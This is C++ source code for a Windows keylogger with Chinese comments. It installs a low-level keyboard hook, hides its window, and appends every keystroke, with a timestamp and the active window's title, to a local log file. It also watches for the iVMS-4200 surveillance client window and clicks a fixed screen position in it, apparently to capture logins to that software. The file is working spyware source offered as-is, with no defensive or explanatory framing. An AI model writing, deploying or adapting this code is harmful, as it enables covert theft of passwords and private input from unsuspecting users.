

#include<Windows.h>
#include <stdio.h>
#include <string.h>
#include <ctime>
#include <fstream>
using namespace std;

HHOOK keyboardHook = 0;		// 钩子句柄
string filename="./log.log";

void fileExists() {
    ifstream file(filename);
	if (!file.good()){ofstream file(filename);}
}

// 向文件写入内容
void writeFile(string strings) {
    ofstream file(filename,ofstream::app);
    if (file.is_open()) {
        file << strings<<endl;
        file.close();
    }
}
LRESULT CALLBACK LowLevelKeyboardProc(
	 int nCode,		// 规定钩子如何处理消息，小于 0 则直接 CallNextHookEx
	 WPARAM wParam,	// 消息类型
	 LPARAM lParam	// 指向某个结构体的指针，这里是 KBDLLHOOKSTRUCT（低级键盘输入事件）
	){
    KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*)lParam;		// 包含低级键盘输入事件信息
	time_t nowtime;
	time(&nowtime); // 获取1970年1月1日0点0分0秒到现在经过的秒数
	tm* p = localtime(&nowtime); // 将秒数转换为本地时间
	char tm[20],wnd_title[400];
	const char* key;
	sprintf(tm,"%02d:%02d:%02d",p->tm_hour, p->tm_min, p->tm_sec);
	GetWindowTextA(GetForegroundWindow(), wnd_title, sizeof(wnd_title));//最新窗口给 0
    if(ks->flags == 128 || ks->flags == 129)
    {
		// 监控键盘
		
		switch(ks->vkCode){
			case 0x30: case 0x60:
				key="0";
				break;
			case 0x31: case 0x61:
				key="1";
				break;
			case 0x32: case 0x62:
				key="2";
				break;
			case 0x33: case 0x63:
				key="3";
				break;
			case 0x34: case 0x64:
				key="4";
				break;
			case 0x35: case 0x65:
				key="5";
				break;
			case 0x36: case 0x66:
				key="6";
				break;
			case 0x37: case 0x67:
				key="7";
				break;
			case 0x38: case 0x68:
				key="8";
				break;
			case 0x39: case 0x69:
				key="9";
				break;
			case 0x41:
				key="A";
				break;
			case 0x42:
				key="B";
				break;
			case 0x43:
				key="C";
				break;
			case 0x44:
				key="D";
				break;
			case 0x45:
				key="E";
				break;
			case 0x46:
				key="F";
				break;
			case 0x47:
				key="G";
				break;
			case 0x48:
				key="H";
				break;
			case 0x49:
				key="I";
				break;
			case 0x4A:
				key="J";
				break;
			case 0x4B:
				key="K";
				break;
			case 0x4C:
				key="L";
				break;
			case 0x4D:
				key="M";
				break;
			case 0x4E:
				key="N";
				break;
			case 0x4F:
				key="O";
				break;
			case 0x50:
				key="P";
				break;
			case 0x51:
				key="Q";
				break;
			case 0x52:
				key="R";
				break;
			case 0x53:
				key="S";
				break;
			case 0x54:
				key="T";
				break;
			case 0x55:
				key="U";
				break;
			case 0x56:
				key="V";
				break;
			case 0x57:
				key="W";
				break;
			case 0x58:
				key="X";
				break;
			case 0x59:
				key="Y";
				break;
			case 0x5A:
				key="Z";
				break;
			case 0x6A:
				key="*";
				break;
			case 0x6B:
				key="+";
				break;
			case 0x6D:
				key="-";
				break;
			case 0x6E:
				key=".";
				break;
			case 0x6F:
				key="/";
				break;
			case 0x0D:
				key="Enter";
				break;
			case 0xA0: case 0xA1:
				key="Shift";
				break;
			case 0x08:
				key="Backspace";
				break;
			case 0x20:
				key="Space";
				break;
		}
		char ms[100];
		sprintf(ms,"%s%s%s%s%s%s","[",tm,"]",wnd_title,">>>",key);
		writeFile(ms);
		//cout<<ms<<endl;
		//cout<<key<<endl;		
        //return key;		// 使按键失效
    }

	// 将消息传递给钩子链中的下一个钩子
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
void lockhik(){
    wstring ex = L"iVMS-4200";
    WCHAR windowTitle[256] = { 0 };
	while (1){
    	int one=GetWindowTextW(GetForegroundWindow(), windowTitle, sizeof(windowTitle));
		if (wstring(windowTitle).find(ex) != string::npos) {
			Sleep(3000);
			int tow=GetWindowTextW(GetForegroundWindow(), windowTitle, sizeof(windowTitle));
			if (one=tow){
				POINT point;
				INT X=1818;
				INT Y=19;
				GetCursorPos(&point);
				SetCursorPos(X,Y);
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, X,Y, 0, 0);
				SetCursorPos(point.x,point.y);
			break;
			}
		}
	}
}
int main(int argc, TCHAR* argv[])
{
	// 安装钩子
	Sleep(1000);
    ShowWindow(GetForegroundWindow(),0);
	fileExists();
    lockhik();
	keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,			// 钩子类型，WH_KEYBOARD_LL 为键盘钩子
		LowLevelKeyboardProc,	// 指向钩子函数的指针
		GetModuleHandleA(NULL),	// Dll 句柄
		0					
		);
    //不可漏掉消息处理，不然程序会卡死
    MSG msg;
    while(1)
    {
		// 如果消息队列中有消息
        if (PeekMessageA(
			&msg,		// MSG 接收这个消息
			NULL,		// 检测消息的窗口句柄，NULL：检索当前线程所有窗口消息
			0,		// 检查消息范围中第一个消息的值，NULL：检查所有消息（必须和下面的同时为NULL）
			0,		// 检查消息范围中最后一个消息的值，NULL：检查所有消息（必须和上面的同时为NULL）
			PM_REMOVE	// 处理消息的方式，PM_REMOVE：处理后将消息从队列中删除
			)){
				// 把按键消息传递给字符消息
				TranslateMessage(&msg);

				// 将消息分派给窗口程序
				DispatchMessageW(&msg);
		}
        else
            Sleep(0);    //避免CPU全负载运行
    }
	// 删除钩子
    UnhookWindowsHookEx(keyboardHook);

	return 0;
}


